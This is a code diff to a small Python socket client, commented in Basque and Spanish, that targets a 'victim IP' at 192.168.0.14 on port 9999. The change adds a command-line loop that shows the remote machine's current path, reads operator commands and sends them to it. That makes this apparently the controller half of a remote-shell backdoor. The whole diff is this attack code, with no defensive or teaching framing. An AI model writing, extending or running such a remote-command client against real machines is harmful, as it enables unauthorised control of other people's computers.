@@ -11,7 +11,13 @@ class cliente(object):
     def __init__(self,ip_biktima,portua):
         self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.so.connect((ip_biktima,portua))
-    
+
+    def comandLIne(self):
+        recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
+        url = str(recibido,encoding='utf-8')#ruta aktuala string modura pasako du
+        mezua  = input(url + ">")
+        self.so.send(bytes(mezua,encoding = 'utf-8'))
+        
     def koneksioa(self):
         while True:
             recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
@@ -59,6 +65,8 @@ class cliente(object):
 
 cliente = cliente("192.168.0.14",9999)
 print("kaixo")
-cliente.koneksioa()
+#cliente.koneksioa()
+while True:
+    cliente.comandLIne()
 
 
